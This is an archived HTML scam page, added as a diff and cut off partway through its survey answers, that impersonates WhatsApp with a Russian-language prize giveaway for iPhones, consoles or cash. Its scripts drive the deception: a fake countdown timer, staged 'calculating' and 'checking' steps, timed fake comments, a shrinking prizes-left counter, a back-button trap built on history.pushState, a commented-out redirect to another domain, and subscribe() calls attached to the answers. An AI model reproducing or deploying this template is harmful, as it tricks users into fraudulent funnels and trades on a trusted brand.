@@ -1,0 +1,1282 @@
+<!-- URL =https://whatsapp10win.top/--><!-- w =('whatsapp10win.top', datetime.datetime(2021, 5, 20, 8, 16, 45), datetime.datetime(2022, 5, 20, 8, 16, 45))--><!DOCTYPE html>
+<html>
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <title>
+   Выиграй один из миллиона призов!
+  </title>
+  <link href="/whatsapp.ico" rel="shortcut icon" type="image/x-icon"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+   <meta content="http://whatsappwin.top/whatsapp.jpg" property="og:image"/>
+   <meta content="WhatsApp раздает подарки!" property="og:title"/>
+   <meta content="Выиграй один из миллиона призов!" property="og:description"/>
+   <meta content="https://whatsappwin.top/" property="og:url"/>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js">
+   </script>
+   <script>
+    //<![CDATA[
+var timer_start = 5; //minutes
+//]]>
+   </script>
+   <script type="text/javascript">
+    //<![CDATA[
+var total = 3;
+jQuery(document).ready(function ($) {
+var survey = {
+step1: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question1").hide();
+$(".anses1").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show step 2
+$(".question_count span").html("2");
+$(".question_count").show();
+$(".question2").show();
+$(".anses2").show();
+}, 1200);
+}, 300);
+},
+step2: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question2").hide();
+$(".anses2").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show step 3
+$(".question_count span").html("3");
+$(".question_count").show();
+$(".question3").show();
+$(".anses3").show();
+}, 1200);
+}, 300);
+},
+step3: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question3").hide();
+$(".anses3").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show checking part
+$(".survey_middle").css("vertical-align","top");
+$(".loading").show();
+setTimeout(function () {
+$(".check1").fadeIn(300);
+setTimeout(function () {
+$(".check2").fadeIn(300);
+setTimeout(function () {
+$(".check3").fadeIn(300);
+setTimeout(function () {
+survey.change();
+}, 1400);
+}, 1100);
+}, 1400);
+}, 750);
+}, 600);
+}, 300);
+},
+change: function(){
+//sakrij gornje
+$(".headline,.small_headlines,.timer").hide();
+//sakrij content surveya
+$(".loading").hide();
+$(".survey_outer").css("height","auto");
+
+$(".last_page").show();
+if(!localStorage['lastPage']){
+localStorage['lastPage'] = true;
+localStorage['lastPageShare'] = 0;
+}
+$(".fbcoms").show();
+waitme();
+}
+};
+
+if(localStorage['lastPage']){
+document.getElementById('number').value = parseInt((localStorage['lastPageShare'] || 0), 10);
+fn1(true);
+$(".question_count").hide();
+$('.question_text').hide();
+$('.ans-box').hide();
+$(".anses2").hide();
+$(".calculating").hide();
+$(".question_count").hide();
+$(".anses3").hide();
+$(".calculating").show();
+$(".calculating").hide();
+
+survey.change();
+}
+
+$(".answer").click(function () {
+if($(this).hasClass("anses1")){
+survey.step1();
+}
+if($(this).hasClass("anses2")){
+survey.step2();
+}
+if($(this).hasClass("anses3")){
+survey.step3();
+}
+});
+var clicks = 0;
+
+$(".like").click(function() {
+if($(this).hasClass("selected")) {
+$(this).removeClass("selected");
+$(this).html("Like");
+$("#youand").html("");
+} else {
+$(this).addClass("selected");
+$(this).html("Unlike");
+$("#youand").html("You and ");
+}
+});
+$(".fblike").click(function() {
+if($(this).hasClass("selected")) {
+$(this).removeClass("selected");
+
+var likes = $(this).children('.likes');
+if(likes.length>0){
+var likesCount =  parseInt($(this).children('.likes').text()) || 0;
+if(likesCount<=1){
+$(this).html('Like');
+}else{
+$(this).html('Like <span class="likes totlikes">'+(likesCount-1)+'</span>');
+}
+}
+} else {
+$(this).addClass("selected");
+var likes = $(this).children('.likes');
+var likesCount =  parseInt($(this).children('.likes').text()) || 0;
+$(this).html('Unlike <span class="likes totlikes">'+(likesCount+1)+'</span>');
+}
+});
+function waitme(){
+FBcom("#fb1",000);
+FBcom("#fb2",000);
+FBcom("#fb3",000);
+FBcom("#fb4",000);
+FBcom("#fb5",00);
+FBcom("#fb6",000);
+FBcom("#fb7",000);
+FBcom("#fb8",0000);
+/* FBcom("#fb9",1000);
+FBcom("#fb10",2000);
+FBcom("#fb11",3000);
+FBcom("#fb12",4000);
+FBcom("#fb13",6000);
+FBcom("#fb14",8000);
+FBcom("#fb15",9000);
+FBcom("#fb16",10000);
+FBcom("#fb17",11000);
+FBcom("#fb18",12000);
+FBcom("#fb19",14000);
+FBcom("#fb20",15000);
+*/
+var ct = 48;
+(function loop() {
+var rand = random(2500,5500);
+var ctrand = random(1,4);
+ct = ct - ctrand;
+if(ct > 1) {
+setTimeout(function() {
+loop();
+}, rand);
+} else {
+ct = "few";
+}
+$("#count").html(ct);
+}());
+}
+function FBcom(a,b) {
+setTimeout(function() {
+var m = 0, n = true, op = 0;
+$(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);
+$().slideDown(500);
+var t = setInterval(function() {
+op += 0.2;
+$(a).css({"opacity":op});
+m++;
+if(m === 5) clearInterval(t);
+}, 100);
+}, b);
+}
+function random(min, max) {
+return Math.round(Math.random() * (max - min) + min);
+}
+var out,pops = {
+init: function(){
+setTimeout(function () {
+var rand_name = pop_names[random(0,pop_names.length-1)];
+var rand_text = pop_texts[random(0,pop_texts.length-1)];
+var text = rand_name + " " + rand_text;
+$(".pops p").html(text);
+$(".pops").fadeIn(500);
+out = setTimeout(function () {
+$(".pops").fadeOut(1000);
+pops.init();
+}, 6000);
+}, random(6000, 15000));
+}
+};
+// pops.init();
+$("#iks").click(function () {
+clearTimeout(out);
+$(".pops").hide();
+pops.init();
+});
+$("#mins").html("0"+timer_start);
+$("#sec").html("00");
+var mins = timer_start, secs = 0, minutes, seconds, timer = {
+init: function(){
+var counter = setInterval(function () {
+$(".timer_heading").addClass("blink");
+setTimeout(function () {
+$(".timer_heading").removeClass("blink");
+}, 500);
+secs--;
+if(secs<0){
+secs = 59;
+mins--;
+if(mins<0){
+clearInterval(counter);
+mins = 0;
+secs = 0;
+$(".timer_heading").hide();
+$(".timer .small_headlines").show();
+}
+if(mins<10){
+minutes = "0" + mins;
+}else{
+minutes = mins;
+}
+}
+if(secs<10){
+seconds = "0" + secs;
+}else{
+seconds = secs;
+}
+$("#mins").html(minutes);
+$("#sec").html(seconds);
+}, 1000);
+}
+};
+timer.init();
+});
+//]]>
+   </script>
+   <script type="text/javascript">
+    //<![CDATA[
+var ii = 0; // needed for safari
+var iy = 0;
+if (typeof history.pushState === "function") {
+history.pushState("back", null, null);
+window.onpopstate = function() {
+history.pushState('back', null, null);
+if (iy==0) {
+//  window.location='https://finhub.icu/d/5e41b0894fdb8';
+iy=0;
+} else if (ii == 1) {
+document.getElementById('popup1').style.display = "none";
+setTimeout(function() {
+if (document.getElementById('popup1').style.display == "none") {
+document.getElementById('popup1').style.display = "block";
+}
+}, 300);
+window.navigator.vibrate(000);
+iy=iy+1;
+}
+};
+}
+setTimeout(function() {
+ii = 1;
+}, 200);
+function hidepop() {
+document.getElementById('popup1').style.display = "none";
+}
+//]]>
+   </script>
+   <style>
+    @import url('https://fonts.googleapis.com/css?family=Montserrat');
+
+
+body,html{
+width: 100%;
+margin: 0;
+font-family: 'Montserrat', sans-serif;
+background: rgb(18, 140, 126);
+}
+/*clearfix*/
+.clearfix:before, .clearfix:after{content:"";display:table;}
+.clearfix:after{clear: both;}
+.clearfix{*zoom: 1;}
+*{
+box-sizing: border-box;
+}
+p{
+margin: 0;
+}
+.cont_outer{
+position: absolute;
+display: table;
+width: 100%;
+height: 100%;
+background-image: url(../img/219958493.jpg);
+background-position: center top;
+background-size: 750px auto;
+background-repeat: repeat-y;
+}
+.bold{
+font-weight: 700;
+}
+/*************************************************** header ***************************************************/
+.header{
+display: table-row;
+width: 100%;
+height: 50px;
+background-color: #fff;
+font-weight: 700;
+}
+.header-inner{
+display: table-cell;
+vertical-align: middle;
+text-align: center;
+}
+.header-inner p{
+vertical-align: middle;
+color: #fff;
+font-size: 18px
+}
+.fblike.selected .likes.totlikes:hover{
+text-decoration: none;
+}
+.header-inner p img{
+vertical-align: middle;
+}
+#folder{
+width: 28px;
+}
+#rupee1{
+width: 14px;
+padding-left: 2px
+}
+/*************************************************** content ***************************************************/
+
+.content{
+display: table-row;
+width: 100%;
+overflow-x: hidden
+}
+.content-middle{
+display: table-cell;
+vertical-align: left;
+width: 100%; / основной блок движение по горизонтали /
+}
+.content-inner{
+width: 95%;
+max-width: 600px;
+margin: 5px auto;
+text-align: center;
+padding: 15px 3px;
+border-radius: 4px;
+background-color: rgb(18, 140, 126);
+}
+#logo{
+width: 220px;
+}
+.headline{
+color: #fff;
+font-weight: bold;
+font-size: 22px;
+line-height: 45px
+}
+.headline,.headline span img{
+vertical-align: middle;
+}
+.headline span{
+vertical-align: top;
+}
+.headline span{
+text-decoration: underline;
+}
+.headline span img{
+width: 12px;
+margin-left: 3px;
+}
+.small_headlines{
+font-size: 16px;
+color: #fff;
+font-weight: 400;
+padding-bottom: 10px;
+}
+.small_headlines img{
+width: 10px;
+margin-left: 3px;
+vertical-align: middle;
+line-height: 22px;
+}
+.question2,.question3{
+display: none;
+}
+/*************************************************** survey ***************************************************/
+.survey_outer{
+display: table;
+width: 95%;
+margin: 15px auto 0;
+background-color: rgb(7, 94, 84);
+border-radius: 4px;
+height: 295px;
+}
+.survey_middle{
+display: table-cell;
+vertical-align: middle;
+}
+.survey_inner{
+display: block;
+width: 95%;
+margin: 0 auto;
+padding: 15px 0;
+position: relative;
+}
+.anses2,.anses3{
+display: none;
+}
+.question_count{
+color: #fff;
+font-size: 24px;
+font-weight: 700;
+}
+.question_text{
+color: #fff;
+font-size: 20px;
+line-height: 38px;
+}
+.question2{
+line-height: 1.2em;
+padding: 10px 0 15px;
+}
+.question3{
+line-height: 1.2em;
+}
+.answer{
+user-select:none;
+width: 80%;
+margin: 15px auto;
+text-align: center;
+padding: 7px 0;
+color: #222;
+background-color: #fff;
+border-radius: 7px;
+border: 1px solid #027CD5;
+font-size: 24px;
+font-weight: 400;
+cursor: pointer;
+-webkit-transition: all 0.3s ease-in-out;
+-moz-transition: all 0.3s ease-in-out;
+transition: all 0.3s ease-in-out;
+}
+.answer:hover{
+color: #222;
+background-color: #fff;
+font-weight: 700;
+}
+.calculating{
+display: none;
+vertical-align: middle;
+font-size: 28px;
+text-transform: uppercase;
+color: #fff;
+font-weight: 700;
+}
+.calculating img{
+vertical-align: middle;
+width: 50px;
+}
+/****** loading ******/
+.loading{
+display: none;
+text-align: center;
+color: #fff;
+font-weight: 700;
+}
+.loading img{
+width: 70%;
+max-width: 220px;
+margin: 0 auto 15px;
+}
+.load_headline{
+font-size: 24px;
+margin: 15px 0;
+}
+.check{
+font-size: 20px;
+margin: 10px 0;
+}
+.check1,.check2,.check3{
+display: none;
+}
+/*************************************************** last page ***************************************************/
+.last_page{
+display: none;
+}
+.last-up{
+text-align: left;
+}
+.textlastup{
+color: #fff;
+font-size: 18px;
+padding-bottom: 8px;
+font-weight: 400;
+}
+.btn{
+width: 80%;
+font-size: 28px;
+max-width: 345px;
+margin: 15px auto;
+background-color: #58BE41;
+border-radius: 5px;
+color: #fff;
+font-weight: 700;
+text-align: center;
+display: block;
+padding: 7px 0;
+text-decoration: none;
+-webkit-transition: all 0.2s ease-in-out;
+-moz-transition: all 0.2s ease-in-out;
+transition: all 0.2s ease-in-out;
+box-shadow: none;
+}
+.btn:hover{
+background-color: #fff;
+color: #58BE41;
+box-shadow: 0 0 2px #58BE41,
+0 0 5px #58BE41,
+0 0 7px #58BE41,
+0 0 11px #58BE41;
+}
+.btn-share{
+font-size: 24px;
+background-color: #58BE41;
+background-size: 40px auto;
+background-position: left 5px top 1px;
+background-repeat: no-repeat;
+}
+
+.progress {      width:80%;      height: 20px;  /* Can be anything */      position: relative;      margin: 60px 0 20px 0; /* Just for demo spacing */      background: #555;      padding: 10px;      -webkit-box-shadow: inset 0 -1px 1px rgba(255,255,255,0.3);      -moz-box-shadow   : inset 0 -1px 1px rgba(255,255,255,0.3);      box-shadow        : inset 0 -1px 1px rgba(255,255,255,0.3);      margin: auto;    }    .progress > span {      display: block;      height: 20px;	  left: 0;	  top: 0;      background-color: #3F51B5;      background-image: -webkit-gradient(         linear,         left bottom,         left top,         color-stop(0, #00BCD4),         color-stop(1, #2196F3)        );      background-image: -moz-linear-gradient(        center bottom,        rgb(43,194,83) 37%,        rgb(84,240,84) 69%       );      -webkit-box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      -moz-box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      position: absolute;      overflow: hidden;    }    .progress > span:after, .animate > span > span {      content: "";      position: absolute;      top: 0; left: 0; bottom: 0; right: 0;      background-image:          -webkit-gradient(linear, 0 0, 100% 100%,             color-stop(.25, rgba(255, 255, 255, .2)),             color-stop(.25, transparent), color-stop(.5, transparent),             color-stop(.5, rgba(255, 255, 255, .2)),             color-stop(.75, rgba(255, 255, 255, .2)),             color-stop(.75, transparent), to(transparent)         );      background-image:         -moz-linear-gradient(          -45deg,             rgba(255, 255, 255, .2) 25%,             transparent 25%,             transparent 50%,             rgba(255, 255, 255, .2) 50%,             rgba(255, 255, 255, .2) 75%,             transparent 75%,             transparent         );      z-index: 1;      -webkit-background-size: 50px 50px;      -moz-background-size: 50px 50px;      -webkit-animation: move 2s linear infinite;         -webkit-border-top-right-radius: 8px;      -webkit-border-bottom-right-radius: 8px;             -moz-border-radius-topright: 8px;          -moz-border-radius-bottomright: 8px;                 border-top-right-radius: 8px;              border-bottom-right-radius: 8px;          -webkit-border-top-left-radius: 20px;       -webkit-border-bottom-left-radius: 20px;              -moz-border-radius-topleft: 20px;           -moz-border-radius-bottomleft: 20px;                  border-top-left-radius: 20px;               border-bottom-left-radius: 20px;      overflow: hidden;    }        .animate > span:after {      display: none;    }        @-webkit-keyframes move {        0% {           background-position: 0 0;        }        100% {           background-position: 50px 50px;        }    }
+
+
+
+
+.btn-down{
+font-size: 24px;
+text-transform: uppercase;
+}
+/*************************************************** facecomms ***************************************************/
+/* COMMENTS */
+.fbcoms {
+font-family: Tahoma, Verdana, sans-serif;
+background-color: #fff;
+width: 100%;
+margin: 0 auto;
+padding: 5px 10px;
+font-size: 12px;
+text-align: left;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+}
+.comments {
+font-weight: bold;
+text-align: center;
+padding: 0 5px 10px 5px;
+}
+.totlikes {
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 23px;
+background-image: url(like.png);
+background-repeat: no-repeat;
+background-position: 5px center;
+background-size: 32%;
+}
+.fbblue {
+color: #3c5a96;
+}
+.buttons {
+padding-bottom: 5px;
+font-family: Arial, sans-serif;
+color: #7d7d7f;
+}
+.buttons span {
+cursor: pointer;
+}
+.buttons span:hover {
+text-decoration: underline;
+}
+.viewmore {
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 23px;
+
+}
+.left {
+cursor: pointer;
+float: left;
+color: #3c5a96;
+}
+.left:hover {
+text-decoration: underline;
+}
+.right {
+color: #7d7d7f;
+float: right;
+}
+.item {
+position: relative;
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 60px;
+min-height: 60px;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+}
+.item .profileimg {
+position: absolute;
+top: 5px;
+left: 5px;
+}
+.comtxt {
+line-height: 16px;
+}
+.name {
+color: #3c5a96;
+font-weight: bold;
+}
+.ago {
+color: #86878c;
+font-size: 0.95em;
+}
+.fblike {
+color: #3c5a96;
+font-size: 0.95em;
+cursor: pointer;
+}
+.fblike:hover {
+text-decoration: underline;
+}
+.combot {
+padding-top: 5px;
+}
+.clickhere {
+font-weight: bold;
+padding: 30px 10px 5px;
+line-height: 18px;
+}
+.likes {
+color: #3c5a96;
+font-size: 0.95em;
+cursor: pointer;
+}
+.fbimg {
+background-color: #fff;
+border-radius: 2px;
+-moz-border-radius: 2px;
+-webkit-border-radius: 2px;
+max-width: 210px;
+width: 100%;
+padding: 3px;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+border: 1px solid #808080;
+margin: 10px 0 5px;
+}
+.hidden {
+display: none;
+opacity: 0;
+}
+.hidden .comtxt, .hidden .combot, .comments {
+display: none;
+}
+.answer{
+cursor: pointer;
+}
+/*************************************************** pops ***************************************************/
+.pops{
+position: fixed;
+top: 80px;
+right: 10px;
+display: none;
+width: 230px;
+margin: 10px 10px 0 0;
+background-color: rgba(173,176,192,0.8);
+width: 230px;
+border-radius: 8px;
+box-shadow: 0 0 7px #888888;
+padding-bottom: 3px
+}
+#piplovi{
+width: 55px;
+margin: 0;
+padding: 5px;
+float: left;
+}
+#iks{
+position: absolute;
+top: -10px;
+right: -10px;
+width: 20px;
+cursor: pointer;
+}
+.pops p{
+width: 170px;
+padding: 2px;
+padding-top: 10px;
+margin-left: 50px;
+font-size: 14px;
+color: #fff;
+word-spacing: 0;
+line-height: 100%;
+}
+/*************************************************** timer ***************************************************/
+.timer .small_headlines{
+display: none;
+}
+.timer_heading{
+width: 80%;
+margin: 0 auto;
+font-size: 16px;
+color: #555;
+font-weight: 400;
+padding-bottom: 10px;
+}
+@-webkit-keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+@-moz-keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+@keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+.blink{
+-webkit-animation: 0.2s bllink ease-in-out alternate;
+-moz-animation: 0.2s bllink ease-in-out alternate;
+animation: 0.2s bllink ease-in-out alternate;
+}
+/*************************************************** media ***************************************************/
+@media screen and (max-width: 600px){
+.cont_outer{
+background-size: 600px auto;
+}
+.headline{
+font-size: 18px;
+}
+.small_headlines,.timer_heading{
+font-size: 13px;
+}
+}
+@media screen and (max-width: 500px){
+.btn{
+width: 90%;
+max-width: 345px;
+}
+}
+@media screen and (max-width: 400px)
+.header-inner p{
+font-size: 14px;
+}
+#rupee1{
+width: 12px;
+padding-left: 2px
+}
+.header{
+height: 40px;
+}
+.answer{
+margin: 10px auto;
+padding: 5px 0;
+border-radius: 7px;
+border: 1px solid #027CD5;
+font-size: 20px;
+color: #222;
+font-weight: 700;
+}
+.survey_outer{
+height: 250px;
+}
+.calculating{
+font-size: 22px;
+}
+.load_headline{
+font-size: 20px;
+margin: 15px 0;
+}
+.check{
+font-size: 16px;
+margin: 10px 0;
+}
+.textlastup{
+font-size: 16px;
+padding-bottom: 5px;
+font-weight: 400;
+}
+.btn{
+width: 100%;
+max-width: 345px;
+}
+.btn-share{
+font-size: 20px;
+background-size: 36px auto;
+}
+.btn-down{
+font-size: 20px;
+}
+}	#main-frame-error{display:none;height:auto}.interstitial-wrapper{padding-top:10px;box-sizing:border-box;font-size:1em;line-height:18px;margin:auto;max-width:600px;width:90%}#today{float:right;font-weight:600;padding-top:15px}#main-message>p{display:inline}#blink{color:#f00;padding:6px;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;-ms-animation:blink 1s infinite;-o-animation:blink 1s infinite;animation:blink 1s infinite}@-webkit-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-moz-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-ms-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}}@-o-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}#theTime{font-size:18px;font-weight:bold;color:red;font-family:sans-serif}h1{color:#000;font-size:1.6em;line-height:1.25em;margin-bottom:16px}#alertimg{height:26px;width:26px;position:absolute;top:13px;left:17px}.popup{display:none;position:absolute;top:20%;left:50%;width:88%;max-width:280px;margin:0 0 0 -140px;font-size:1em;border-radius:4px;background-color:#282828;color:#fff;overflow:hidden;box-shadow:1px 1px 7px #000;z-index:100}.popup-head{background-color:#282828;padding:18px 16px 18px 55px;border-bottom:2px solid #33b4e4;color:#33b4e4;line-height:normal}.popup-center{padding:20px 16px;color:#f3f3f3;line-height:20px}.popup-bottom{background-color:#282828;padding:9px 6px;text-align:center;border-top:1px solid #474747;overflow:hidden}.popup-bottom .button{display:block;height:30px;width:128px;margin:0 auto;font-size:1.1em;color:#f3f3f3;border-radius:3px;cursor:pointer;text-decoration:none;padding:0;line-height:30px}
+
+a {
+text-decoration: none;
+}
+   </style>
+  </meta>
+ </head>
+ <body>
+  <center>
+   <!-- <img src="/whatsapp.png" style="display:none;"/> -->
+   <div class="popup fourth" id="popup1" style="display:none">
+    <div class="popup-head">
+    </div>
+    <div class="popup-center">
+     Чтобы получить приз, пройдите небольшой опрос
+    </div>
+    <div class="popup-bottom">
+     <div class="button" onclick="hidepop();">
+      OK
+     </div>
+    </div>
+   </div>
+   <div class="content">
+    <!-- content -->
+    <div class="content-middle">
+     <div class="content-inner">
+      <img alt="" src="data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTkuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iTGF5ZXJfMSIgeD0iMHB4IiB5PSIwcHgiIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyOyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgd2lkdGg9IjUxMnB4IiBoZWlnaHQ9IjUxMnB4Ij4KPHBhdGggc3R5bGU9ImZpbGw6IzIwQTgzRTsiIGQ9Ik00MzcuMDE5LDc0Ljk4QzM4OC42NjgsMjYuNjI4LDMyNC4zOCwwLDI1NiwwUzEyMy4zMzMsMjYuNjI4LDc0Ljk4LDc0Ljk4UzAsMTg3LjYyLDAsMjU2ICBjMCw1MS40ODUsMTUuMTU0LDEwMC45MzgsNDMuODc0LDE0My4zNEwwLjY5LDUwMC4xMDZjLTEuMzQzLDMuMTM0LTAuNjA3LDYuOTY2LDEuNzk4LDkuMzgxYzIuNDk1LDIuNTA2LDYuNTE5LDMuMjA2LDkuNzE0LDEuNjg0ICBsOTYuMzU4LTQ1Ljg4NUMxNTEuODU4LDQ5NS44NjYsMjAyLjcyMSw1MTIsMjU2LDUxMmM2OC4zOCwwLDEzMi42NjgtMjYuNjI4LDE4MS4wMTktNzQuOThDNDg1LjM3MSwzODguNjY3LDUxMiwzMjQuMzgsNTEyLDI1NiAgUzQ4NS4zNzEsMTIzLjMzMyw0MzcuMDE5LDc0Ljk4eiIvPgo8Y2lyY2xlIHN0eWxlPSJmaWxsOiNFNUU1RTU7IiBjeD0iMjU2IiBjeT0iMjU2IiByPSIyMTMuMzMzIi8+CjxjaXJjbGUgc3R5bGU9ImZpbGw6I0ZGRkZGRjsiIGN4PSIyNTYiIGN5PSIyNTYiIHI9IjE4Ny43MzMiLz4KPHBhdGggc3R5bGU9ImZpbGw6IzIwQTgzRTsiIGQ9Ik0zOTIuMzkxLDM0Mi42NDFsLTcuNjczLTQxLjU2MWMtMC42MzUtMy40MzItMy4yOTUtNi4xMzMtNi43MTgtNi44MThsLTYwLjMzOS0xMi4wNjcgIGMtMi44MDItMC41NTktNS42OTEsMC4zMTctNy43MDksMi4zMzRsLTI0LjUxNCwyNC41MTRjLTQxLjMwMi0xOC41MDctNjQuMjI2LTQxLjQ3OC04NC4zOTYtODQuNTU1bDI0LjQzNS0yNC40MzYgIGMyLjAxOC0yLjAxNywyLjg5My00LjkxLDIuMzM0LTcuNzA4bC0xMi4wNjgtNjAuMzRjLTAuNjg1LTMuNDIzLTMuMzg2LTYuMDg0LTYuODE5LTYuNzE4bC00MS41NjEtNy42NzMgIGMtMS4xMzgtMC4yMS0yLjMxLTAuMTg3LTMuNDQsMC4wN2MtMTAuOTc0LDIuNDk0LTIwLjk4Nyw4LjAyMy0yOC45NTYsMTUuOTk0Yy0xMy44MDEsMTMuODAxLTE5LjA3NSwzMy45MzgtMTUuMjUyLDU4LjIzNyAgYzYuNDE4LDQwLjgwMSwyNi40MDksOTcuNTgzLDYzLjI4OSwxMzQuNjFsMC41MDIsMC41YzM3LjAwMSwzNi44NTUsOTMuNzgyLDU2Ljg0NiwxMzQuNTgzLDYzLjI2NSAgYzUuMTQsMC44MDksMTAuMDkyLDEuMjEsMTQuODM4LDEuMjFjMTcuNjk0LDAsMzIuNTE3LTUuNTgxLDQzLjQtMTYuNDYyYzcuOTctNy45NzEsMTMuNS0xNy45ODQsMTUuOTkzLTI4Ljk1NyAgQzM5Mi41NzgsMzQ0Ljk1MSwzOTIuNjAyLDM0My43OCwzOTIuMzkxLDM0Mi42NDF6Ii8+CjxwYXRoIHN0eWxlPSJmaWxsOiMxODk0MzM7IiBkPSJNMzQ5Ljk5NiwzNzYuNDI4Yy00Ljc0NywwLTkuNjk4LTAuNDAxLTE0LjgzOC0xLjIxYy00MC44MDEtNi40MTktOTcuNTgzLTI2LjQxLTEzNC41ODMtNjMuMjY1ICBsLTAuNTAyLTAuNWMtMzYuODgtMzcuMDI3LTU2Ljg3LTkzLjgwOS02My4yODktMTM0LjYxYy0zLjMyMy0yMS4xMTgsMC4yMzYtMzkuMDg4LDEwLjI4My01Mi40OTIgIGMtNC4zODgsMi41NjUtOC40NTgsNS42ODktMTIuMDk3LDkuMzI4Yy0xMy44MDEsMTMuODAxLTE5LjA3NSwzMy45MzgtMTUuMjUyLDU4LjIzN2M2LjQxOCw0MC44MDEsMjYuNDA5LDk3LjU4Myw2My4yODksMTM0LjYxICBsMC41MDIsMC41YzM3LjAwMSwzNi44NTUsOTMuNzgyLDU2Ljg0NiwxMzQuNTgzLDYzLjI2NWM1LjE0LDAuODA5LDEwLjA5MiwxLjIxLDE0LjgzOCwxLjIxYzE3LjY5NCwwLDMyLjUxNy01LjU4MSw0My40LTE2LjQ2MiAgYzEuOTc0LTEuOTc0LDMuNzk3LTQuMDc1LDUuNDYzLTYuMjg0QzM3Mi43NDcsMzczLjgzNiwzNjIuMDM3LDM3Ni40MjgsMzQ5Ljk5NiwzNzYuNDI4eiIvPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8L3N2Zz4K" style="width: 50%;"/>
+      <br/>
+      <br/>
+      <p class="headline">
+      </p>
+      <p class="small_headlines">
+       <b>
+        10 лет вместе!
+        <br/>
+        Пройди опрос и получи iPhone 12 Pro, PlayStation 4, Xbox One или денежный приз!
+        <br/>
+        Проведение акции 19-05-2021 - 26-05-2021
+       </b>
+       <br/>
+       <!--<b>только для <u>граждан РФ</u></b>-->
+      </p>
+      <br>
+       <div class="survey_outer">
+        <div class="survey_middle">
+         <div class="survey_inner">
+          <!--  <p class='question_count'>
+Pergunta
+<span>
+1
+</span>
+de 3
+</p> -->
+          <p class="question_text question1">
+           Каким мессенджером вы пользуетесь чаще?
+          </p>
+          <p class="question_text question2">
+           Как давно вы пользуетесь нашим приложением?
+          </p>
+          <p class="question_text question3">
+           Пользуетесь ли вы группами в нашем приложении?
+          </p>
+          <div class="ans-box">
+           <div class="answer anses1">
+            <p onclick="localStorage.mess=1;subscribe();">
+             WhatsApp
+            </p>
+           </div>
+           <div class="answer anses1">
+            <p onclick="localStorage.mess=2;subscribe();">
+             Viber
+            </p>
+           </div>
+           <div class="answer anses1">
+            <p onclick="localStorage.mess=3;subscribe();">
+             Telegram
+            </p>
+           </div>
+           <div class="answer anses1">
+            <p onclick="subscribe();">
+             Другое
+            </p>
+           </div>
+           <div class="answer anses2">
+            <p>
+             Месяц или меньше
+            </p>
+           </div>
+           <div class="answer anses2">
+            <p>
+             Полгода или меньше
+            </p>
+           </div>
+           <div class="answer anses2">
+            <p>
+             Больше года
